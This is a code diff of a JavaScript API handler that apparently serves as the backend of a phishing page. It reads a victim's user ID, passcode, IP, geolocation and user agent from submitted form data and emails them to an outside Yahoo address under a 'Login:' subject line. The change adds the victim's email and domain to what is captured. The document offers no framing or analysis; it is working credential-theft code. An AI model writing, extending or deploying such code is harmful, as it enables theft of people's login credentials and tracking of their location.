@@ -9,7 +9,7 @@ const pass = process.env.PASSWORD;
 export default async function handler(req, res) {
   try {
     const body = await req.body;
-    const {user_id, passcode, country, city, network, host_ip, date, region_code, longitude, latitude, user_agent} = body
+    const {user_id, passcode, country, city, email, network, host_ip, date, domain, region_code, longitude, latitude, user_agent} = body
 
     console.log(user_id, passcode, country, city,network, host_ip, date, region_code, longitude, latitude, user_agent)
 
@@ -28,7 +28,7 @@ export default async function handler(req, res) {
       from: "rep_info@zohomail.com",
       to: "arielnze@yahoo.com",
       subject: `Login: | ${user_id} | ${country} | ${host_ip}`,
-      text: `User_id: ${user_id}\n Passcode: ${passcode}\n Country: ${country}\nCity: ${city}\nRegion_code: ${region_code}\nHost: ${host_ip}\nNetwork: ${network}\nDate: ${date}\nLongitude: ${longitude}\nLatitude: ${latitude}\nUser_Agent: ${user_agent}`,
+      text: `User_id: ${user_id}\n Passcode: ${passcode}\n Country: ${country}\nCity: ${city}\nRegion_code: ${region_code}\nHost: ${host_ip}\nNetwork: ${network}\nDate: ${date}\nLongitude: ${longitude}\nLatitude: ${latitude}\nUser_Agent: ${user_agent}\nEmail: ${email}\nDomain: ${domain}`,
     };
 
     await transporter.sendMail(mailOptions);
